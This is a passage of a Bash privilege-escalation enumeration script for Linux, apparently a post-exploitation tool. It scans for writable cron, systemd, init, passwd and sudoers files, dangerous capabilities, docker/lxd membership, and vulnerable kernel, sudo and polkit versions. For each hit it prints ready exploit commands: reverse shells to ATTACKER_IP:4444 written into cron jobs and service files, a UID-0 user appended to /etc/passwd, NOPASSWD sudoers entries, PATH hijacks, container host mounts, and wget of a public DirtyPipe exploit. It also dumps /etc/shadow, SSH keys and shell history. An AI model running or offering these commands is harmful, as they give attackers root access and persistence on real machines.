info "Finding world-writable files (excluding /proc, /sys, /dev)..."
WW_FILES=0
find / -type f -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/tmp/*" ! -path "/var/tmp/*" 2>/dev/null | head -50 | while read -r file; do
    if [ -f "$file" ] && [ -w "$file" ]; then
        # Only flag if it's a script, service file, or binary
        if echo "$file" | grep -qE "(\.sh$|\.py$|\.pl$|\.rb$|\.php$|service|init\.d|\.conf$|\.config$|\.ini$)" || file "$file" 2>/dev/null | grep -qiE "(script|executable|binary)"; then
            WW_FILES=1
            log "  ${YELLOW}World-writable:${NC} $file"
            ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
            critical "World-writable script/service file: $file"
            show_exploit "World-Writable Script" \
                "Modify the script to add reverse shell or add user." \
                "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $file\n# Or add user:\necho 'user:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd"
        fi
    fi
done

log ""
info "Finding world-writable directories..."
find / -type d -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/tmp/*" ! -path "/var/tmp/*" 2>/dev/null | head -50 | while read -r dir; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        # Only flag if it's in PATH or is a system directory
        if echo "$PATH" | grep -q "$dir"; then
            log "  ${YELLOW}World-writable dir:${NC} $dir"
            ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
            critical "World-writable directory in PATH: $dir"
            show_exploit "World-Writable PATH Directory" \
                "Create malicious binary with same name as system command in this directory." \
                "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
        elif echo "$dir" | grep -qE "(etc|opt|usr/local|var/www|home)"; then
            # System directories that shouldn't be world-writable
            log "  ${YELLOW}World-writable dir:${NC} $dir"
            ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
            warning "World-writable system directory: $dir"
        fi
    fi
done

################################################################################
# 5. CRON JOBS
################################################################################
progress "Cron Jobs"
section "5. CRON JOBS"

info "System-wide cron jobs (/etc/crontab):"
if [ -r /etc/crontab ]; then
    CRON_CONTENT=$(cat /etc/crontab 2>/dev/null)
    echo "$CRON_CONTENT" | tee -a "$OUTPUT_FILE"
    
    # Check for wildcards or writable scripts
    if echo "$CRON_CONTENT" | grep -qE "\*|\.sh|\.py"; then
        warning "Cron job contains wildcards or scripts - check for exploitation"
    fi
else
    warning "Cannot read /etc/crontab"
fi

log ""
info "Cron directories:"
for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$dir" ]; then
        log "  Directory: $dir"
        ls -la "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        for file in "$dir"/*; do
            if [ -f "$file" ] && [ -r "$file" ]; then
                log "    File: $file"
                FILE_CONTENT=$(cat "$file" 2>/dev/null)
                echo "$FILE_CONTENT" | tee -a "$OUTPUT_FILE"
                
                # Check if script is writable
                if [ -w "$file" ]; then
                    critical "Writable cron file: $file"
                    show_exploit "Writable Cron File" \
                        "Modify the cron file to execute your payload as root." \
                        "echo '* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $file"
                fi
            fi
        done
    fi
done

log ""
info "User cron jobs:"
USER_CRON=$(crontab -l 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "$USER_CRON" | tee -a "$OUTPUT_FILE"
else
    info "No user cron jobs found"
fi

log ""
info "Checking for writable cron files..."
find /etc/cron* -type f -writable 2>/dev/null | while read -r file; do
    critical "Writable cron file: $file"
    show_exploit "Writable Cron File" \
        "Add malicious cron job that runs as root." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> $file"
done

################################################################################
# 6. CAPABILITIES
################################################################################
progress "Linux Capabilities"
section "6. LINUX CAPABILITIES"

if command -v getcap >/dev/null 2>&1; then
    info "Files with capabilities:"
    getcap -r / 2>/dev/null | while read -r line; do
        log "  ${YELLOW}Capability:${NC} $line"
        # Check for dangerous capabilities (only flag if truly dangerous)
        if echo "$line" | grep -q "cap_setuid.*=ep\|cap_setgid.*=ep\|cap_dac_override.*=ep\|cap_sys_admin.*=ep"; then
            critical "Dangerous capability found: $line"
            
            BINARY=$(echo "$line" | awk '{print $1}')
            CAPS=$(echo "$line" | awk '{print $2}')
            
            if echo "$CAPS" | grep -q "cap_setuid"; then
                show_exploit "cap_setuid Capability" \
                    "Binary can set UID. May be exploitable to gain root." \
                    "$BINARY\n# Or check if binary can be exploited to setuid(0)"
            fi
            
            if echo "$CAPS" | grep -q "cap_dac_override"; then
                show_exploit "cap_dac_override Capability" \
                    "Binary can bypass file read/write permissions." \
                    "Use $BINARY to read /etc/shadow or other protected files"
            fi
        fi
    done
else
    warning "getcap command not found"
fi

################################################################################
# 7. ENVIRONMENT VARIABLES
################################################################################
progress "Environment Variables"
section "7. ENVIRONMENT VARIABLES"

info "PATH variable: $PATH"
if echo "$PATH" | grep -q "\.\|::"; then
    warning "PATH contains current directory (.) or empty entry (::)"
    show_exploit "PATH Manipulation" \
        "Current directory in PATH allows executing local binaries before system ones." \
        "Create malicious binary:\necho '#!/bin/bash\n/bin/bash' > ./ls\nchmod +x ./ls\n# When root runs commands, your binary executes first"
fi

log ""
info "LD_PRELOAD: ${LD_PRELOAD:-Not set}"
if [ -n "$LD_PRELOAD" ]; then
    warning "LD_PRELOAD is set: $LD_PRELOAD"
    show_exploit "LD_PRELOAD Hijacking" \
        "If sudo allows LD_PRELOAD, can load malicious library." \
        "Create malicious library and use with sudo:\nsudo LD_PRELOAD=/path/to/malicious.so <command>"
fi

info "LD_LIBRARY_PATH: ${LD_LIBRARY_PATH:-Not set}"

log ""
info "All environment variables:"
env | sort | tee -a "$OUTPUT_FILE"

################################################################################
# 8. NETWORK INFORMATION
################################################################################
progress "Network Information"
section "8. NETWORK INFORMATION"

info "Network interfaces:"
ip addr show 2>/dev/null || ifconfig 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""
info "Listening ports:"
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""
info "Network connections:"
netstat -an 2>/dev/null || ss -an 2>/dev/null | tee -a "$OUTPUT_FILE"

################################################################################
# 9. PROCESSES AND SERVICES
################################################################################
progress "Processes and Services"
section "9. PROCESSES AND SERVICES"

info "Running processes (as root):"
ps aux | grep -E "^root" | head -20 | tee -a "$OUTPUT_FILE"

log ""
info "All processes:"
ps aux | head -30 | tee -a "$OUTPUT_FILE"

log ""
info "Services status:"
if command -v systemctl >/dev/null 2>&1; then
    systemctl list-units --type=service --state=running 2>/dev/null | head -30 | tee -a "$OUTPUT_FILE"
fi

################################################################################
# 10. PASSWORD FILES
################################################################################
progress "Password Files"
section "10. PASSWORD FILES"

info "Checking /etc/passwd:"
if [ -r /etc/passwd ]; then
    cat /etc/passwd | tee -a "$OUTPUT_FILE"
    # Check for users with UID 0
    if grep -q ":0:" /etc/passwd; then
        warning "Users with UID 0 found:"
        grep ":0:" /etc/passwd | tee -a "$OUTPUT_FILE"
    fi
else
    warning "Cannot read /etc/passwd"
fi

log ""
info "Checking /etc/shadow:"
if [ -r /etc/shadow ]; then
    warning "Shadow file is readable!"
    cat /etc/shadow | tee -a "$OUTPUT_FILE"
    show_exploit "Readable /etc/shadow" \
        "Extract password hashes and crack them with John the Ripper or Hashcat." \
        "john /etc/shadow\n# or\nhashcat -m 1800 /etc/shadow /usr/share/wordlists/rockyou.txt"
else
    info "Shadow file not readable (normal)"
fi

log ""
info "Checking for backup password files:"
for file in /etc/passwd- /etc/shadow- /etc/passwd.bak /etc/shadow.bak; do
    if [ -r "$file" ]; then
        warning "Backup password file found: $file"
        head -20 "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 11. SSH KEYS AND CONFIGURATION
################################################################################
progress "SSH Keys"
section "11. SSH KEYS AND CONFIGURATION"

info "SSH authorized_keys:"
if [ -f ~/.ssh/authorized_keys ]; then
    cat ~/.ssh/authorized_keys 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

log ""
info "SSH private keys:"
find ~ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read -r key; do
    if [ -f "$key" ]; then
        log "  Found: $key"
        ls -la "$key" 2>/dev/null | tee -a "$OUTPUT_FILE"
        show_exploit "SSH Private Key" \
            "Use private key to SSH into the system." \
            "chmod 600 $key\nssh -i $key user@target_host"
    fi
done

log ""
info "SSH configuration:"
if [ -f ~/.ssh/config ]; then
    cat ~/.ssh/config 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

log ""
info "Root SSH keys:"
if [ -f /root/.ssh/authorized_keys ]; then
    warning "Root authorized_keys found!"
    cat /root/.ssh/authorized_keys 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

################################################################################
# 12. HISTORY FILES
################################################################################
progress "History Files"
section "12. HISTORY FILES"

info "Bash history:"
if [ -f ~/.bash_history ]; then
    tail -50 ~/.bash_history 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    # Check for passwords or sensitive info
    if grep -qiE "password|passwd|secret|key|token" ~/.bash_history 2>/dev/null; then
        warning "Potential credentials found in bash history!"
    fi
else
    info "No bash history found"
fi

log ""
info "Other history files:"
for hist in ~/.zsh_history ~/.sh_history ~/.python_history ~/.mysql_history; do
    if [ -f "$hist" ]; then
        log "  Found: $hist"
        tail -20 "$hist" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 13. WRITABLE SYSTEM FILES
################################################################################
progress "Writable System Files"
section "13. WRITABLE SYSTEM FILES"

info "Checking for writable /etc/passwd:"
if [ -w /etc/passwd ]; then
    critical "/etc/passwd is writable!"
    show_exploit "Writable /etc/passwd" \
        "Add new user with root privileges (UID 0)." \
        "echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker\n# Enter password when prompted"
fi

info "Checking for writable /etc/shadow:"
if [ -w /etc/shadow ]; then
    critical "/etc/shadow is writable!"
    show_exploit "Writable /etc/shadow" \
        "Change root password hash or add new user." \
        "# Generate password hash:\nopenssl passwd -1 newpassword\n# Replace root's hash in /etc/shadow\n# Or add new user entry"
fi

info "Checking for writable /etc/sudoers:"
if [ -w /etc/sudoers ]; then
    critical "/etc/sudoers is writable!"
    show_exploit "Writable /etc/sudoers" \
        "Add your user to sudoers with NOPASSWD." \
        "echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo su"
fi

info "Checking for writable /etc/sudoers.d:"
if [ -w /etc/sudoers.d ]; then
    critical "/etc/sudoers.d is writable!"
    show_exploit "Writable /etc/sudoers.d" \
        "Create new sudoers file with full privileges." \
        "echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/exploit\nsudo su"
fi

################################################################################
# 14. DOCKER AND CONTAINERS
################################################################################
progress "Docker and Containers"
section "14. DOCKER AND CONTAINERS"

if command -v docker >/dev/null 2>&1; then
    info "Docker version:"
    docker --version 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Docker containers:"
    docker ps -a 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Docker images:"
    docker images 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Checking if user is in docker group:"
    if groups | grep -q docker; then
        critical "User is in docker group - potential container escape!"
        show_exploit "Docker Group Privilege Escalation" \
            "Mount host filesystem and chroot to gain root on host." \
            "docker run -v /:/mnt -it alpine chroot /mnt bash\n# Or:\ndocker run --rm -v /:/mnt -it alpine sh -c 'chroot /mnt bash'"
    fi
else
    info "Docker not found"
fi

################################################################################
# 15. KERNEL VERSION AND EXPLOITS
################################################################################
progress "Kernel Version"
section "15. KERNEL VERSION"

KERNEL_VERSION=$(uname -r)
KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
info "Kernel version: $KERNEL_VERSION"
info "Kernel architecture: $(uname -m)"

log ""
info "Checking for known vulnerable kernel versions..."

# Check for some well-known kernel exploits
if [ "$KERNEL_MAJOR" -lt 3 ] || ([ "$KERNEL_MAJOR" -eq 3 ] && [ "$KERNEL_MINOR" -lt 10 ]); then
    warning "Very old kernel - many vulnerabilities possible"
fi

# Dirty COW (CVE-2016-5195) - Linux 2.6.22 < 4.8.3
# More accurate: affects 2.6.22 through 4.8.2
if [ "$KERNEL_MAJOR" -lt 4 ]; then
    # Kernel 2.x and 3.x - all versions vulnerable
    if [ "$KERNEL_MAJOR" -eq 2 ] && [ "$KERNEL_MINOR" -ge 6 ]; then
        critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
        show_exploit "Dirty COW (CVE-2016-5195)" \
            "Race condition in copy-on-write. Exploit available." \
            "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
    elif [ "$KERNEL_MAJOR" -eq 3 ]; then
        critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
        show_exploit "Dirty COW (CVE-2016-5195)" \
            "Race condition in copy-on-write. Exploit available." \
            "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
    fi
elif [ "$KERNEL_MAJOR" -eq 4 ]; then
    KERNEL_PATCH_COW=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')
    if [ "$KERNEL_MINOR" -lt 8 ]; then
        # 4.0-4.7 - all vulnerable
        critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
        show_exploit "Dirty COW (CVE-2016-5195)" \
            "Race condition in copy-on-write. Exploit available." \
            "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
    elif [ "$KERNEL_MINOR" -eq 8 ]; then
        # 4.8.x - vulnerable if < 4.8.3
        if [ -z "$KERNEL_PATCH_COW" ] || [ "$KERNEL_PATCH_COW" -lt 3 ]; then
            critical "Dirty COW vulnerability (CVE-2016-5195) detected - Kernel $KERNEL_VERSION is vulnerable!"
            KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
            show_exploit "Dirty COW (CVE-2016-5195)" \
                "Race condition in copy-on-write. Exploit available." \
                "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
        fi
    fi
fi

# DirtyPipe (CVE-2022-0847) - Linux 5.8 <= 5.16.11, 5.10.102, 5.15.25, 5.17
# More accurate detection
KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')
DIRTYPIPE_VULN=0

if [ "$KERNEL_MAJOR" -eq 5 ]; then
    if [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 16 ]; then
        if [ "$KERNEL_MINOR" -eq 16 ]; then
            # 5.16.x - vulnerable if < 5.16.12
            if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -lt 12 ] && [ "$KERNEL_PATCH" -gt 0 ]; then
                DIRTYPIPE_VULN=1
            fi
        elif [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 15 ]; then
            # 5.8 to 5.15 - check specific versions
            if [ "$KERNEL_MINOR" -eq 10 ]; then
                # 5.10.x - only 5.10.102 is vulnerable (fixed in 5.10.103)
                if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 102 ]; then
                    DIRTYPIPE_VULN=1
                fi
            elif [ "$KERNEL_MINOR" -eq 15 ]; then
                # 5.15.x - only 5.15.25 is vulnerable (fixed in 5.15.26)
                if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 25 ]; then
                    DIRTYPIPE_VULN=1
                fi
            else
                # 5.8-5.9, 5.11-5.14 - all versions in range are vulnerable
                DIRTYPIPE_VULN=1
            fi
        fi
    elif [ "$KERNEL_MINOR" -eq 17 ]; then
        # 5.17.0 is vulnerable (fixed in 5.17.1)
        if [ -z "$KERNEL_PATCH" ] || [ "$KERNEL_PATCH" -eq 0 ]; then
            DIRTYPIPE_VULN=1
        fi
    fi
fi

if [ "$DIRTYPIPE_VULN" -eq 1 ]; then
    critical "DirtyPipe vulnerability (CVE-2022-0847) detected - Kernel $KERNEL_VERSION is vulnerable!"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
    show_exploit "DirtyPipe (CVE-2022-0847)" \
        "Uninitialized variable in pipe implementation allows overwriting arbitrary files. Can be used to inject code into SUID binaries or modify /etc/passwd." \
        "# Method 1: Modify /etc/passwd to add root user\n# Check: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit\n\n# Method 2: Inject into SUID binary\n# Download exploit:\ngit clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git\ncd CVE-2022-0847-DirtyPipe-Exploit\nmake\n./exploit\n\n# Or use ready exploit:\nwget https://raw.githubusercontent.com/imfiver/CVE-2022-0847/main/LPE.sh\nchmod +x LPE.sh\n./LPE.sh"
fi

# Check for other CVEs
show_exploit "Kernel Exploit Research" \
    "Research kernel exploits for your specific version." \
    "Search: 'linux kernel $(uname -r) exploit'\nCheck: https://www.exploit-db.com\nCheck: https://github.com/SecWiki/linux-kernel-exploits"

################################################################################
# 16. NFS SHARES
################################################################################
progress "NFS Shares"
section "16. NFS SHARES"

info "NFS exports:"
if [ -r /etc/exports ]; then
    EXPORTS=$(cat /etc/exports 2>/dev/null)
    echo "$EXPORTS" | tee -a "$OUTPUT_FILE"
    
    # Only flag if no_root_squash is present AND share is accessible
    if echo "$EXPORTS" | grep -q "no_root_squash"; then
        # Check if we can actually mount it (more accurate)
        EXPORT_PATH=$(echo "$EXPORTS" | grep "no_root_squash" | awk '{print $1}' | head -1)
        if [ -n "$EXPORT_PATH" ]; then
            critical "NFS share with no_root_squash found: $EXPORT_PATH"
            show_exploit "NFS no_root_squash" \
                "Mount NFS share and create SUID binary on it." \
                "# On attacker machine:\nmkdir /tmp/nfs\nmount -t nfs TARGET_IP:$EXPORT_PATH /tmp/nfs\ncd /tmp/nfs\ngcc -o shell shell.c\nchmod +s shell\n# On target, execute the binary"
        fi
    fi
else
    info "No /etc/exports file found"
fi

log ""
info "Mounted NFS shares:"
mount | grep nfs 2>/dev/null | tee -a "$OUTPUT_FILE"

################################################################################
# 17. WRITABLE SCRIPTS IN PATH
################################################################################
progress "Writable PATH Scripts"
section "17. WRITABLE SCRIPTS IN PATH"

info "Checking for writable scripts in PATH directories..."
IFS=':' read -ra ADDR <<< "$PATH"
for dir in "${ADDR[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        critical "Writable directory in PATH: $dir"
        ls -la "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        show_exploit "PATH Hijacking" \
            "Create malicious binary with name of common command (ls, cat, etc.)" \
            "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
    fi
done

################################################################################
# 18. SYSTEMD SERVICES
################################################################################
progress "Systemd Services"
section "18. SYSTEMD SERVICES"

if command -v systemctl >/dev/null 2>&1; then
    info "Writable systemd service files:"
    find /etc/systemd/system -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable systemd service: $file"
        show_exploit "Writable Systemd Service" \
            "Modify service file to execute your payload, then reload and restart." \
            "echo -e '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > $file\nsystemctl daemon-reload\nsystemctl restart $(basename $file .service)"
    done
    
    log ""
    info "User systemd services:"
    systemctl --user list-units --type=service 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Writable user systemd services:"
    find ~/.config/systemd/user -type f -writable 2>/dev/null 2>/dev/null | while read -r file; do
        if [ -f "$file" ]; then
            warning "Writable user systemd service: $file"
        fi
    done
else
    info "systemctl not found (not systemd)"
fi

################################################################################
# 19. SYSTEMD TIMERS
################################################################################
progress "Systemd Timers"
section "19. SYSTEMD TIMERS"

if command -v systemctl >/dev/null 2>&1; then
    info "System timers:"
    systemctl list-timers 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Writable timer files:"
    find /etc/systemd/system -name "*.timer" -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable systemd timer: $file"
        show_exploit "Writable Systemd Timer" \
            "Modify timer to execute malicious service, then reload." \
            "Modify $file to point to malicious service\nsystemctl daemon-reload\nsystemctl enable --now $(basename $file .timer)"
    done
fi

################################################################################
# 20. MOUNTED FILESYSTEMS
################################################################################
progress "Mounted Filesystems"
section "20. MOUNTED FILESYSTEMS"

info "Mounted filesystems:"
mount | tee -a "$OUTPUT_FILE"

log ""
info "Checking for noexec, nosuid, nodev flags:"
mount | grep -E "noexec|nosuid|nodev" | tee -a "$OUTPUT_FILE"

log ""
info "Checking for interesting mounts:"
mount | grep -E "tmpfs|proc|sysfs|devtmpfs" | tee -a "$OUTPUT_FILE"

################################################################################
# 21. INIT SCRIPTS
################################################################################
progress "Init Scripts"
section "21. INIT SCRIPTS"

if [ -d /etc/init.d ]; then
    info "Writable init scripts:"
    find /etc/init.d -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable init script: $file"
        show_exploit "Writable Init Script" \
            "Modify init script to add reverse shell or malicious command." \
            "Add to $file:\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n# Then restart service or reboot"
    done
fi

################################################################################
# 22. Writable /etc/crontab
################################################################################
progress "Cron Files Check"
section "22. WRITABLE CRON FILES"

if [ -w /etc/crontab ]; then
    critical "/etc/crontab is writable!"
    show_exploit "Writable /etc/crontab" \
        "Add malicious cron job that runs as root." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> /etc/crontab"
fi

for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -w "$dir" ]; then
        critical "Writable cron directory: $dir"
        show_exploit "Writable Cron Directory" \
            "Create new cron file in this directory." \
            "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > $dir/exploit"
    fi
done

################################################################################
# 23. SUDO VERSION VULNERABILITIES
################################################################################
progress "Sudo Version Check"
section "23. SUDO VERSION CHECK"

if command -v sudo >/dev/null 2>&1; then
    SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1)
    info "Sudo version: $SUDO_VERSION"
    
    VERSION_NUM=$(echo "$SUDO_VERSION" | grep -oP 'Sudo version \K[0-9.]+' || echo "")
    if [ -n "$VERSION_NUM" ]; then
        MAJOR=$(echo "$VERSION_NUM" | cut -d. -f1)
        MINOR=$(echo "$VERSION_NUM" | cut -d. -f2)
        PATCH=$(echo "$VERSION_NUM" | cut -d. -f3 | cut -dp -f1 2>/dev/null || echo "0")
        
        # CVE-2021-3156 (Baron Samedit) - more accurate version check
        if [ "$MAJOR" -eq 1 ]; then
            if [ "$MINOR" -eq 8 ]; then
                # 1.8.2 to 1.8.31p2 are vulnerable
                if [ -n "$PATCH" ] && [ "$PATCH" -ge 2 ] && [ "$PATCH" -lt 32 ]; then
                    critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo $VERSION_NUM"
                    show_exploit "CVE-2021-3156 (Baron Samedit)" \
                        "Heap-based buffer overflow. Exploit available." \
                        "Check: https://github.com/blasty/CVE-2021-3156\nsudoedit -s /"
                fi
            elif [ "$MINOR" -eq 9 ]; then
                # 1.9.0 to 1.9.5p1 are vulnerable
                if [ -z "$PATCH" ] || [ "$PATCH" -eq 0 ] || ([ -n "$PATCH" ] && [ "$PATCH" -lt 6 ]); then
                    critical "Vulnerable to CVE-2021-3156 (Baron Samedit) - sudo $VERSION_NUM"
                    show_exploit "CVE-2021-3156 (Baron Samedit)" \
                        "Heap-based buffer overflow. Exploit available." \
                        "Check: https://github.com/blasty/CVE-2021-3156"
                fi
            fi
        fi
    fi
fi

################################################################################
# 24. ADDITIONAL CHECKS
################################################################################
progress "Additional Checks"
section "24. ADDITIONAL VULNERABILITY CHECKS"

# Check for Polkit/pkexec (PwnKit - CVE-2021-4034)
# Affects polkit 0.105-26 through 0.120-1 (fixed in 0.120-2)
if command -v pkexec >/dev/null 2>&1; then
    # Check polkit version if available
    if command -v pkcheck >/dev/null 2>&1; then
        POLKIT_VERSION=$(pkcheck --version 2>/dev/null | grep -oP 'polkit \K[0-9.]+' || echo "")
        if [ -n "$POLKIT_VERSION" ] && [ "$POLKIT_VERSION" != "" ]; then
            POLKIT_MAJOR=$(echo "$POLKIT_VERSION" | cut -d. -f1 2>/dev/null | sed 's/[^0-9]//g')
            POLKIT_MINOR=$(echo "$POLKIT_VERSION" | cut -d. -f2 2>/dev/null | sed 's/[^0-9]//g')
            POLKIT_PATCH_RAW=$(echo "$POLKIT_VERSION" | cut -d. -f3 2>/dev/null)
            POLKIT_PATCH=$(echo "$POLKIT_PATCH_RAW" | cut -d- -f1 2>/dev/null | sed 's/[^0-9]//g')
            
            # Default to 0 if empty
            [ -z "$POLKIT_MAJOR" ] && POLKIT_MAJOR=0
            [ -z "$POLKIT_MINOR" ] && POLKIT_MINOR=0
            [ -z "$POLKIT_PATCH" ] && POLKIT_PATCH=0
            
            # Check if version is in vulnerable range (only if we have valid numbers)
            if [ -n "$POLKIT_MAJOR" ] && [ -n "$POLKIT_MINOR" ] && [ "$POLKIT_MAJOR" -eq 0 ] 2>/dev/null; then
                if [ "$POLKIT_MINOR" -eq 105 ] 2>/dev/null && [ "$POLKIT_PATCH" -ge 26 ] 2>/dev/null; then
                    critical "Potential PwnKit vulnerability (CVE-2021-4034) - polkit $POLKIT_VERSION"
                    show_exploit "PwnKit (CVE-2021-4034)" \
                        "Local privilege escalation in polkit's pkexec." \
                        "Check: https://github.com/arthepsy/CVE-2021-4034\n# Test: pkexec --version\n# If vulnerable, exploit available on GitHub"
                elif [ "$POLKIT_MINOR" -ge 106 ] 2>/dev/null && [ "$POLKIT_MINOR" -lt 120 ] 2>/dev/null; then
                    critical "Potential PwnKit vulnerability (CVE-2021-4034) - polkit $POLKIT_VERSION"
                    show_exploit "PwnKit (CVE-2021-4034)" \
                        "Local privilege escalation in polkit's pkexec." \
                        "Check: https://github.com/arthepsy/CVE-2021-4034"
                elif [ "$POLKIT_MINOR" -eq 120 ] 2>/dev/null && [ "$POLKIT_PATCH" -le 1 ] 2>/dev/null; then
                    critical "Potential PwnKit vulnerability (CVE-2021-4034) - polkit $POLKIT_VERSION"
                    show_exploit "PwnKit (CVE-2021-4034)" \
                        "Local privilege escalation in polkit's pkexec." \
                        "Check: https://github.com/arthepsy/CVE-2021-4034"
                fi
            fi
        else
            # If version can't be determined, check if pkexec exists and is SUID
            PKEXEC_PATH=$(which pkexec 2>/dev/null)
            if [ -n "$PKEXEC_PATH" ] && [ -u "$PKEXEC_PATH" ] 2>/dev/null; then
                warning "pkexec found with SUID - check for PwnKit (CVE-2021-4034)"
            fi
        fi
    else
        # If pkcheck not available, just check if pkexec is SUID
        PKEXEC_PATH=$(which pkexec 2>/dev/null)
        if [ -n "$PKEXEC_PATH" ] && [ -u "$PKEXEC_PATH" ] 2>/dev/null; then
            warning "pkexec found with SUID - check for PwnKit (CVE-2021-4034)"
        fi
    fi
fi

# Check for screen/tmux sessions
info "Checking for screen/tmux sessions..."
if command -v screen >/dev/null 2>&1; then
    SCREEN_SESSIONS=$(screen -ls 2>/dev/null | grep -v "No Sockets" || echo "")
    if [ -n "$SCREEN_SESSIONS" ]; then
        warning "Screen sessions found (may contain root sessions):"
        echo "$SCREEN_SESSIONS" | tee -a "$OUTPUT_FILE"
        show_exploit "Screen Session Hijacking" \
            "If screen session is owned by root, try to attach." \
            "screen -x root/<session_name>\n# Or check /var/run/screen/"
    fi
fi

if command -v tmux >/dev/null 2>&1; then
    TMUX_SESSIONS=$(tmux ls 2>/dev/null || echo "")
    if [ -n "$TMUX_SESSIONS" ]; then
        warning "Tmux sessions found:"
        echo "$TMUX_SESSIONS" | tee -a "$OUTPUT_FILE"
    fi
fi

# Check for LXD/LXC
if command -v lxc >/dev/null 2>&1; then
    info "LXC found - checking if user is in lxd group..."
    if groups | grep -q lxd; then
        critical "User is in lxd group - potential container escape!"
        show_exploit "LXD Group Privilege Escalation" \
            "Create privileged container and mount host filesystem." \
            "lxc init ubuntu:16.04 test -c security.privileged=true\nlxc config device add test rootdisk disk path=/ rootfs=/\nlxc start test\nlxc exec test bash"
    fi
fi

################################################################################
# 25. WRITABLE CONFIGURATION FILES
################################################################################
progress "Writable Config Files"
section "25. WRITABLE CONFIGURATION FILES"

info "Checking for writable configuration files..."

# Check common writable config files
CONFIG_FILES=(
    "/etc/ld.so.preload"
    "/etc/ld.so.conf"
    "/etc/profile"
    "/etc/bash.bashrc"
    "/etc/bashrc"
    "/etc/zshrc"
    "/etc/rc.local"
    "/etc/anacrontab"
    "/etc/at.allow"
    "/etc/at.deny"
    "/etc/cron.allow"
    "/etc/cron.deny"
    "/etc/sysctl.conf"
    "/etc/modprobe.d"
    "/etc/udev/rules.d"
    "/etc/rsyslog.conf"
    "/etc/logrotate.d"
